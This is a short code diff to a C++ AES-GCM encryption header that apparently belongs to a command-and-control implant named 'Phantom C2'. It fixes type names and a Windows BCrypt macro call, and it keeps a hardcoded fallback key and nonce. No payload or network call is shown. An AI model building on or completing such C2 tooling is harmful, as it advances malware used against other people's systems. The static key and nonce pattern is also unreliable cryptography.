@@ -31,12 +31,13 @@
 namespace crypto {
 
 // ── Key Material ────────────────────────────────────────────────────────────
-// Generated at compile time from .env via phantom.utils.c2_crypto.
+// If compiling manually, we use these safe defaults. 
+// The builder.py will normally provide crypto_config.h.
 #if __has_include("crypto_config.h")
     #include "crypto_config.h"
 #else
-    static const BYTE AES_KEY[]   = "PhantomC2_SecretKey_32bytes_Long";
-    static const BYTE AES_NONCE[] = "PhntmNonce12";
+    static const unsigned char AES_KEY[]   = "PhantomC2_SecretKey_32bytes_Long";
+    static const unsigned char AES_NONCE[] = "PhntmNonce12";
 #endif
 
 constexpr ULONG KEY_LEN   = 32;
@@ -107,7 +108,7 @@ inline std::string encrypt(const std::string& plaintext) {
 
     BYTE tag[TAG_LEN];
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
-    BCRYPT_INIT_AUTH_INFO(authInfo);
+    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
     authInfo.pbNonce = nonce;
     authInfo.cbNonce = NONCE_LEN;
     authInfo.pbTag = tag;
@@ -189,7 +190,7 @@ inline std::string decrypt(const std::string& ciphertext_b64) {
     memcpy(nonce, AES_NONCE, NONCE_LEN);
 
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
-    BCRYPT_INIT_AUTH_INFO(authInfo);
+    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
     authInfo.pbNonce = nonce;
     authInfo.cbNonce = NONCE_LEN;
     authInfo.pbTag = tag;
